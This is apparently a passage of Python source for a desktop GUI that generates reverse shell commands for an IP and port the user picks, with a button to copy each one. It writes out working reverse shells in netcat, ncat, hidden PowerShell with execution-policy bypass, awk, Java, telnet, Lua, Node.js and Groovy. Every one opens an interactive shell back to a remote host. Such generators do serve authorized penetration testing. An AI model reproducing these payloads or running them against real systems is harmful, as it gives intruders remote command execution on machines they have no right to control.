            radiobutton_1 = customtkinter.CTkRadioButton(self.rdbtn_frame_1, text="BusyBox",variable=self.rs_netcat_radio_var, value=2, command=lambda:Reverse_Shells.rs_netcat.change_rs_netcat_type(self), fg_color=self.colormain,hover_color=self.color_hover)
            radiobutton_1.grid(row=1, column=3, padx=10, pady=10, sticky="ew")

            self.rs_netcatlabel = customtkinter.CTkTextbox(self.rs_frame,)
            self.rs_netcatlabel.insert("0.0", text=self.rs_netcat_shell);self.rs_netcatlabel.configure(state="disabled")
            self.rs_netcatlabel.grid(row=2, column=0, columnspan=4, padx=10, pady=10, sticky="ew")

            btn_copy = customtkinter.CTkButton(self.rs_frame,hover_color=self.color_hover, text="Copy Shell", command=lambda: pyperclip.copy(self.rs_netcat_shell))
            btn_copy.grid(row=3, column=0, columnspan=4, padx=10, pady=10, sticky="ew")
            btn_copy.configure(fg_color=self.colormain)
            
            print(f"[INFO | {Get.return_time()}] Reverse Shell: {self.rs_netcat_shell}")

            Reverse_Shells.rs_netcat.change_rs_netcat_type(self)
        
        def change_rs_netcat_type(self):
            val = self.rs_netcat_radio_var.get()
            if val == 0:
                self.rs_netcat_shell = Reverse_Shells.rs_netcat.return_rs_netcat_traditional(self)
                self.rs_netcatlabel.configure(state="normal");self.rs_netcatlabel.delete("0.0", "end")
                self.rs_netcatlabel.insert("0.0", text=self.rs_netcat_shell);self.rs_netcatlabel.configure(state="disabled")
            elif val == 1:
                self.rs_netcat_shell = Reverse_Shells.rs_netcat.return_rs_netcat_openbsd(self)
                self.rs_netcatlabel.configure(state="normal");self.rs_netcatlabel.delete("0.0", "end") 
                self.rs_netcatlabel.insert("0.0", text=self.rs_netcat_shell);self.rs_netcatlabel.configure(state="disabled")
            elif val == 2:
                self.rs_netcat_shell = Reverse_Shells.rs_netcat.return_rs_netcat_busybox(self)
                self.rs_netcatlabel.configure(state="normal");self.rs_netcatlabel.delete("0.0", "end") 
                self.rs_netcatlabel.insert("0.0", text=self.rs_netcat_shell);self.rs_netcatlabel.configure(state="disabled")
            print(f"[INFO | {Get.return_time()}] Reverse Shell: {self.rs_netcat_shell}")

        def return_rs_netcat_traditional(self):
            return f"nc -e /bin/sh {self.ip_selected} {self.port_selected}"
        
        def return_rs_netcat_openbsd(self):
            return f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.ip_selected} {self.port_selected} >/tmp/f"
        
        def return_rs_netcat_busybox(self):
            return f"rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {self.ip_selected} {self.port_selected} >/tmp/f"

    class rs_ncat:

        def __init__(self, RSGeneratorApp) -> None:
              
            self = RSGeneratorApp
            
            self.rs_ncat_shell = Reverse_Shells.rs_ncat.return_rs_ncat_tcp(self)

            self.rs_ncat_label_frame = customtkinter.CTkFrame(self.rs_frame)
            self.rs_ncat_label_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)

            self.rs_ncat_select_shell = customtkinter.CTkOptionMenu(self.rs_ncat_label_frame, variable=self.select_shell_var, command=lambda value:Common.select_callback(self), fg_color=self.colormain,button_color=self.color_optionbtn, button_hover_color=self.color_hover)
            self.rs_ncat_select_shell.configure(values=Get.select_list())
            self.rs_ncat_select_shell.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)
            self.rs_ncat_label_frame.grid_columnconfigure(1, weight=1)

            self.rdbtn_frame_2 = customtkinter.CTkFrame(self.rs_frame)
            self.rdbtn_frame_2.grid(row=1, column=2, padx=10, pady=10, sticky="ew", columnspan=2)

            self.rs_ncat_radio_var = tkinter.IntVar(value=0)
            radiobutton_1 = customtkinter.CTkRadioButton(self.rdbtn_frame_2, text="TCP",variable=self.rs_ncat_radio_var, value=0, command=lambda:Reverse_Shells.rs_ncat.change_rs_ncat_type(self),fg_color=self.colormain,hover_color=self.color_hover)
            radiobutton_1.grid(row=1, column=1, padx=10, pady=10, sticky="ew")
            radiobutton_2 = customtkinter.CTkRadioButton(self.rdbtn_frame_2, text="UDP",variable=self.rs_ncat_radio_var, value=1, command=lambda:Reverse_Shells.rs_ncat.change_rs_ncat_type(self),fg_color=self.colormain,hover_color=self.color_hover)
            radiobutton_2.grid(row=1, column=2, columnspan=4, padx=10, pady=10, sticky="ew")

            self.rs_ncatlabel = customtkinter.CTkTextbox(self.rs_frame,)
            self.rs_ncatlabel.insert("0.0", text=self.rs_ncat_shell);self.rs_ncatlabel.configure(state="disabled")
            self.rs_ncatlabel.grid(row=2, column=0, columnspan=4, padx=10, pady=10, sticky="ew")

            btn_copy = customtkinter.CTkButton(self.rs_frame,hover_color=self.color_hover, text="Copy Shell", command=lambda: pyperclip.copy(self.rs_ncat_shell))
            btn_copy.grid(row=3, column=0, columnspan=4, padx=10, pady=10, sticky="ew")
            btn_copy.configure(fg_color=self.colormain)
            
            print(f"[INFO | {Get.return_time()}] Reverse Shell: {self.rs_ncat_shell}")

            Reverse_Shells.rs_ncat.change_rs_ncat_type(self)
        
        def change_rs_ncat_type(self):
            val = self.rs_ncat_radio_var.get()
            if val == 0:
                self.rs_ncat_shell = Reverse_Shells.rs_ncat.return_rs_ncat_tcp(self)
                self.rs_ncatlabel.configure(state="normal");self.rs_ncatlabel.delete("0.0", "end")
                self.rs_ncatlabel.insert("0.0", text=self.rs_ncat_shell);self.rs_ncatlabel.configure(state="disabled")
            elif val == 1:
                self.rs_ncat_shell = Reverse_Shells.rs_ncat.return_rs_ncat_udp(self)
                self.rs_ncatlabel.configure(state="normal");self.rs_ncatlabel.delete("0.0", "end")
                self.rs_ncatlabel.insert("0.0", text=self.rs_ncat_shell);self.rs_ncatlabel.configure(state="disabled")
            print(f"[INFO | {Get.return_time()}] Reverse Shell: {self.rs_ncat_shell}")

        def return_rs_ncat_tcp(self):
            return f"ncat {self.ip_selected} {self.port_selected} -e /bin/bash"
        
        def return_rs_ncat_udp(self):
            return f"ncat --udp {self.ip_selected} {self.port_selected} -e /bin/bash"
        
    class rs_powershell:

        def __init__(self, RSGeneratorApp) -> None:

            self = RSGeneratorApp

            shell_parts = {
                1: f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{self.ip_selected}",{self.port_selected});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%',
                2: '{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
            }

            shell = ''.join(shell_parts.values())

            self.rs_powershell_label_frame = customtkinter.CTkFrame(self.rs_frame)
            self.rs_powershell_label_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)

            self.rs_powershell_select_shell = customtkinter.CTkOptionMenu(self.rs_powershell_label_frame, variable=self.select_shell_var, command=lambda value:Common.select_callback(self), fg_color=self.colormain,button_color=self.color_optionbtn, button_hover_color=self.color_hover)
            self.rs_powershell_select_shell.configure(values=Get.select_list())
            self.rs_powershell_select_shell.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)
            self.rs_powershell_label_frame.grid_columnconfigure(1, weight=1)

            self.no_option_frame.grid(row=1, column=2, padx=10, pady=10, sticky="ew", columnspan=2)
            self.no_option_label.grid(row=1, column=1, padx=10, pady=10, sticky="ew")

            label = customtkinter.CTkTextbox(self.rs_frame,)
            label.insert("0.0", text=shell);label.configure(state="disabled")
            label.grid(row=2, column=0, columnspan=4, padx=10, pady=10, sticky="ew")

            btn_copy = customtkinter.CTkButton(self.rs_frame,hover_color=self.color_hover, text="Copy Shell", command=lambda: pyperclip.copy(str(shell)))
            btn_copy.grid(row=3, column=0, columnspan=4, padx=10, pady=10, sticky="ew")
            btn_copy.configure(fg_color=self.colormain)
            
            print(f"[INFO | {Get.return_time()}] Reverse Shell: {shell}")

    class rs_awk:

        def __init__(self, RSGeneratorApp) -> None:

            self = RSGeneratorApp

            shell_parts = {
                1: "awk 'BEGIN {s = ",
                2: f'"/inet/tcp/0/{self.ip_selected}/{self.port_selected}"',
                3: '; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}',
                4: "' /dev/null"
            }

            shell = ''.join(shell_parts.values())

            self.rs_awk_label_frame = customtkinter.CTkFrame(self.rs_frame)
            self.rs_awk_label_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)

            self.rs_awk_select_shell = customtkinter.CTkOptionMenu(self.rs_awk_label_frame, variable=self.select_shell_var, command=lambda value:Common.select_callback(self), fg_color=self.colormain,button_color=self.color_optionbtn, button_hover_color=self.color_hover)
            self.rs_awk_select_shell.configure(values=Get.select_list())
            self.rs_awk_select_shell.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)
            self.rs_awk_label_frame.grid_columnconfigure(1, weight=1)

            self.no_option_frame.grid(row=1, column=2, padx=10, pady=10, sticky="ew", columnspan=2)
            self.no_option_label.grid(row=1, column=1, padx=10, pady=10, sticky="ew")

            label = customtkinter.CTkTextbox(self.rs_frame,)
            label.insert("0.0", text=shell);label.configure(state="disabled")
            label.grid(row=2, column=0, columnspan=4, padx=10, pady=10, sticky="ew")

            btn_copy = customtkinter.CTkButton(self.rs_frame,hover_color=self.color_hover, text="Copy Shell", command=lambda: pyperclip.copy(str(shell)))
            btn_copy.grid(row=3, column=0, columnspan=4, padx=10, pady=10, sticky="ew")
            btn_copy.configure(fg_color=self.colormain)
            
            print(f"[INFO | {Get.return_time()}] Reverse Shell: {shell}")

    class rs_java:
        
        def __init__(self, RSGeneratorApp) -> None:

            self = RSGeneratorApp

            shell_parts = {
                1: 'Runtime.getRuntime().exec("/bin/bash -c ',
                2: f"'exec 5<>/dev/tcp/{self.ip_selected}/{self.port_selected};cat <&5 | while read line; do $line 2>&5 >&5; done'",
                3: '").waitFor();'
            }

            shell = ''.join(shell_parts.values())

            self.rs_java_label_frame = customtkinter.CTkFrame(self.rs_frame)
            self.rs_java_label_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)

            self.rs_java_select_shell = customtkinter.CTkOptionMenu(self.rs_java_label_frame, variable=self.select_shell_var, command=lambda value:Common.select_callback(self), fg_color=self.colormain,button_color=self.color_optionbtn, button_hover_color=self.color_hover)
            self.rs_java_select_shell.configure(values=Get.select_list())
            self.rs_java_select_shell.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)
            self.rs_java_label_frame.grid_columnconfigure(1, weight=1)

            self.no_option_frame.grid(row=1, column=2, padx=10, pady=10, sticky="ew", columnspan=2)
            self.no_option_label.grid(row=1, column=1, padx=10, pady=10, sticky="ew")

            label = customtkinter.CTkTextbox(self.rs_frame,)
            label.insert("0.0", text=shell);label.configure(state="disabled")
            label.grid(row=2, column=0, columnspan=4, padx=10, pady=10, sticky="ew")

            btn_copy = customtkinter.CTkButton(self.rs_frame,hover_color=self.color_hover, text="Copy Shell", command=lambda: pyperclip.copy(str(shell)))
            btn_copy.grid(row=3, column=0, columnspan=4, padx=10, pady=10, sticky="ew")
            btn_copy.configure(fg_color=self.colormain)
            
            print(f"[INFO | {Get.return_time()}] Reverse Shell: {shell}")

    class rs_telnet:

        def __init__(self, RSGeneratorApp) -> None:

            self = RSGeneratorApp

            self.port_selected_2 = self.port_selected + '1'
            
            shell = f"telnet {self.ip_selected} {self.port_selected} | /bin/sh | telnet {self.ip_selected} {self.port_selected_2}"

            self.rs_telnet_label_frame = customtkinter.CTkFrame(self.rs_frame)
            self.rs_telnet_label_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)

            self.rs_telnet_select_shell = customtkinter.CTkOptionMenu(self.rs_telnet_label_frame, variable=self.select_shell_var, command=lambda value:Common.select_callback(self), fg_color=self.colormain,button_color=self.color_optionbtn, button_hover_color=self.color_hover)
            self.rs_telnet_select_shell.configure(values=Get.select_list())
            self.rs_telnet_select_shell.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)
            self.rs_telnet_label_frame.grid_columnconfigure(1, weight=1)

            self.no_option_frame.grid(row=1, column=2, padx=10, pady=10, sticky="ew", columnspan=2)
            self.no_option_label.grid(row=1, column=1, padx=10, pady=10, sticky="ew")

            label = customtkinter.CTkTextbox(self.rs_frame,)
            label.insert("0.0", text=shell);label.configure(state="disabled")
            label.grid(row=2, column=0, columnspan=4, padx=10, pady=10, sticky="ew")

            btn_copy = customtkinter.CTkButton(self.rs_frame,hover_color=self.color_hover, text="Copy Shell", command=lambda:pyperclip.copy(str(shell)))
            btn_copy.grid(row=3, column=0, columnspan=4, padx=10, pady=10, sticky="ew")
            btn_copy.configure(fg_color=self.colormain)
            
            print(f"[INFO | {Get.return_time()}] Reverse Shell: {shell}")

    class rs_lua:
            
        def __init__(self, RSGeneratorApp) -> None:

            self = RSGeneratorApp
            
            shell_parts = {
                1: "lua5.1 -e 'local host, port = ",
                2: f'"{self.ip_selected}", {self.port_selected} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close',
                3: "()'"
            }

            shell = ''.join(shell_parts.values())

            self.rs_lua_label_frame = customtkinter.CTkFrame(self.rs_frame)
            self.rs_lua_label_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)

            self.rs_lua_select_shell = customtkinter.CTkOptionMenu(self.rs_lua_label_frame, variable=self.select_shell_var, command=lambda value:Common.select_callback(self), fg_color=self.colormain,button_color=self.color_optionbtn, button_hover_color=self.color_hover)
            self.rs_lua_select_shell.configure(values=Get.select_list())
            self.rs_lua_select_shell.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)
            self.rs_lua_label_frame.grid_columnconfigure(1, weight=1)

            self.no_option_frame.grid(row=1, column=2, padx=10, pady=10, sticky="ew", columnspan=2)
            self.no_option_label.grid(row=1, column=1, padx=10, pady=10, sticky="ew")

            label = customtkinter.CTkTextbox(self.rs_frame,)
            label.insert("0.0", text=shell);label.configure(state="disabled")
            label.grid(row=2, column=0, columnspan=4, padx=10, pady=10, sticky="ew")

            btn_copy = customtkinter.CTkButton(self.rs_frame,hover_color=self.color_hover, text="Copy Shell", command=lambda: pyperclip.copy(str(shell)))
            btn_copy.grid(row=3, column=0, columnspan=4, padx=10, pady=10, sticky="ew")
            btn_copy.configure(fg_color=self.colormain)
            
            print(f"[INFO | {Get.return_time()}] Reverse Shell: {shell}")

    class rs_nodejs:

        def __init__(self, RSGeneratorApp) -> None:

            self = RSGeneratorApp
            
            shell = f"require('child_process').exec('nc -e /bin/sh {self.ip_selected} {self.port_selected}')"

            self.rs_nodejs_label_frame = customtkinter.CTkFrame(self.rs_frame)
            self.rs_nodejs_label_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)

            self.rs_nodejs_select_shell = customtkinter.CTkOptionMenu(self.rs_nodejs_label_frame, variable=self.select_shell_var, command=lambda value:Common.select_callback(self), fg_color=self.colormain,button_color=self.color_optionbtn, button_hover_color=self.color_hover)
            self.rs_nodejs_select_shell.configure(values=Get.select_list())
            self.rs_nodejs_select_shell.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)
            self.rs_nodejs_label_frame.grid_columnconfigure(1, weight=1)

            self.no_option_frame.grid(row=1, column=2, padx=10, pady=10, sticky="ew", columnspan=2)
            self.no_option_label.grid(row=1, column=1, padx=10, pady=10, sticky="ew")

            label = customtkinter.CTkTextbox(self.rs_frame,)
            label.insert("0.0", text=shell);label.configure(state="disabled")
            label.grid(row=2, column=0, columnspan=4, padx=10, pady=10, sticky="ew")

            btn_copy = customtkinter.CTkButton(self.rs_frame,hover_color=self.color_hover, text="Copy Shell", command=lambda: pyperclip.copy(str(shell)))
            btn_copy.grid(row=3, column=0, columnspan=4, padx=10, pady=10, sticky="ew")
            btn_copy.configure(fg_color=self.colormain)
            
            print(f"[INFO | {Get.return_time()}] Reverse Shell: {shell}")

    class rs_groovy:

        def __init__(self, RSGeneratorApp) -> None:

            self = RSGeneratorApp
            
            shell_parts = {
                1: f'Process p=new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();Socket s=new Socket({self.ip_selected},{self.port_selected});InputStream',
                2: 'pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();'
            }

            shell = ''.join(shell_parts.values())

            self.rs_groovy_label_frame = customtkinter.CTkFrame(self.rs_frame)
            self.rs_groovy_label_frame.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)

            self.rs_groovy_select_shell = customtkinter.CTkOptionMenu(self.rs_groovy_label_frame, variable=self.select_shell_var, command=lambda value:Common.select_callback(self), fg_color=self.colormain,button_color=self.color_optionbtn, button_hover_color=self.color_hover)
            self.rs_groovy_select_shell.configure(values=Get.select_list())
            self.rs_groovy_select_shell.grid(row=1, column=0, padx=10, pady=10, sticky="ew", columnspan=2)
            self.rs_groovy_label_frame.grid_columnconfigure(1, weight=1)

            self.no_option_frame.grid(row=1, column=2, padx=10, pady=10, sticky="ew", columnspan=2)
            self.no_option_label.grid(row=1, column=1, padx=10, pady=10, sticky="ew")
            
            label = customtkinter.CTkTextbox(self.rs_frame,)
            label.insert("0.0", text=shell);label.configure(state="disabled")
            label.grid(row=2, column=0, columnspan=4, padx=10, pady=10, sticky="ew")

            btn_copy = customtkinter.CTkButton(self.rs_frame,hover_color=self.color_hover, text="Copy Shell", command=lambda: pyperclip.copy(str(shell)))
            btn_copy.grid(row=3, column=0, columnspan=4, padx=10, pady=10, sticky="ew")
            btn_copy.configure(fg_color=self.colormain)
            
            print(f"[INFO | {Get.return_time()}] Reverse Shell: {shell}")

app = RSGeneratorApp()
app.mainloop() 